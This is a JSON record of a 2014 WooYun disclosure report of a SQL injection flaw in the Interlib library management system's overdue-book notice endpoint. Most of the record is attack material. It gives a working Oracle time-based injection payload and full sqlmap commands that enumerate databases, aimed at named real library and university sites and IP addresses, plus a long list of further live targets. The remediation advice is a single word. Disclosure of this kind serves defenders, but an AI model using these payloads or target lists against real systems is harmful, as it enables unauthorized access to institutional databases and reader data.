{"id": 43853, "wybug_id": "wooyun-2014-081435", "wybug_title": "图创interlib图书管理系统SQL注入漏洞", "wybug_corp": "广州图创计算机软件开发有限公司", "wybug_author": "路人甲", "wybug_date": "2014-10-31 12:40", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-05：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： RT,影响众多高校用户 详细说明：  图创interlib图书管理系统用户量千余家，包括各大省级图书馆、事业单位和大量高校用户百度搜索：opac, 图创, interlib, 图书检索, 借书, , 图创图书馆\n\n图创interlib图书管理系统在“图书催还通知”功能上存在POST型SQL注入漏洞\n注入链接： /opac/publicNotice/bookOverdue注入参数： searchValuePayload： page=1&rows=10&prevPage=1&hasNextPage=true&searchType=rdid&searchValue=11111111' AND 7305=DBMS_PIPE.RECEIVE_MESSAGE(CHR(81)||CHR(78)||CHR(106)||CHR(81),5) AND 'ZdoM'='ZdoM&orderBy=&classno=&libcode=&batchno=&classNoName=&language=&state=&specificLibcode=SQLMAP注入命令：python sqlmap.py -u  http://xxxx/opac/publicNotice/bookOverdue     --data=\"page=1&rows=10&prevPage=1&hasNextPage=true&searchType=rdid&searchValue=11111111&orderBy=&classno=&libcode=&batchno=&classNoName=&language=&state=&specificLibcode=\" -p searchValue --level 5 --risk 3 --dbms oracle --technique=T  --random-agent --dbs -v 3 --batch\n   漏洞证明：  \n(1) http://opac.dqytlib.com/opac/publicNotice/bookOverdue\n\n\n\n\n\npython sqlmap.py -u  http://opac.dqytlib.com/opac/publicNotice/bookOverdue   --data=\"page=1&rows=10&prevPage=1&hasNextPage=true&searchType=rdid&searchValue=11111111&orderBy=&classno=&libcode=&batchno=&classNoName=&language=&state=&specificLibcode=\" -p searchValue --level 5 --risk 3 --dbms oracle --technique=T  --random-agent --dbs -v 3 --batch\n\n\n\n(2) http://218.27.88.203/opac/publicNotice/bookOverduepython sqlmap.py -u  http://218.27.88.203/opac/publicNotice/bookOverdue     --data=\"page=1&rows=10&prevPage=1&hasNextPage=true&searchType=rdid&searchValue=11111111&orderBy=&classno=&libcode=&batchno=&classNoName=&language=&state=&specificLibcode=\" -p searchValue --level 5 --risk 3 --dbms oracle --technique=T  --random-agent --dbs -v 3 --batch\n\n\n\n(3) http://interweb.xmlib.net/opac/publicNotice/bookOverduepython sqlmap.py -u   http://interweb.xmlib.net/opac/publicNotice/bookOverdue    --data=\"page=1&rows=10&prevPage=1&hasNextPage=true&searchType=rdid&searchValue=11111111&orderBy=&classno=&libcode=&batchno=&classNoName=&language=&state=&specificLibcode=\" -p searchValue --level 5 --risk 3 --dbms oracle --technique=T  --random-agent --dbs -v 3 --batch\n\n\n\n其他测试案例：http://opac.sspu.edu.cn/opac/publicNotice/bookOverdue http://opac.hkc.edu.cn/opac/publicNotice/bookOverdue http://opac.cdclib.org/opac/publicNotice/bookOverdue http://opac.hflib.gov.cn/lib2/publicNotice/bookOverdue http://interweb.xmlib.net/opac/publicNotice/bookOverdue http://opac.lixin.edu.cn/opac//publicNotice/bookOverdue http://reader.szlib.com/opac/publicNotice/bookOverdue http://opac.dqytlib.com/opac//publicNotice/bookOverdue http://218.27.88.203/opac/publicNotice/bookOverdue http://202.114.89.11/opac/publicNotice/bookOverdue http://210.37.32.7/opac/publicNotice/bookOverdue http://opac.lib.hnu.cn/opac/publicNotice/bookOverdue http://opac.lib.sx.cn/opac/publicNotice/bookOverdue http://index.lnlib.net.cn/opac/publicNotice/bookOverdue http://opac.sdlib.com.cn/opac/publicNotice/bookOverdue http://opac.lib.sx.cn/opac/publicNotice/bookOverdue\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 2015-01-04：感谢您对图创软件的关注，漏洞信息已提交公司相关部门处理！  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}